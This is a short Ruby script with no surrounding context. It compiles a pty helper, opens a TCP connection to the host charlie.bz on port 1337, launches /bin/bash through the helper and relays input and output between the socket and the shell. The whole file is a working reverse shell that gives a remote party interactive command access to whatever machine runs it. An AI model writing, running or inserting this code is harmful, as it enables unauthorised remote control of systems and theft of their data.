ldflags = ""
if RUBY_PLATFORM =~ /linux/
  ldflags << " -lutil"
end
`gcc -o ptydo ptydo.c #{ldflags}`
port = 1337
require "socket"
sock = TCPSocket.new("charlie.bz", port)
bash = IO.popen("./ptydo /bin/bash", "w+")
loop do
  read, write = IO.select [sock, bash], []
  if read.include? sock
    bash.write sock.read_nonblock 1024
  end
  if read.include? bash
    sock.write bash.read_nonblock 1024
  end
end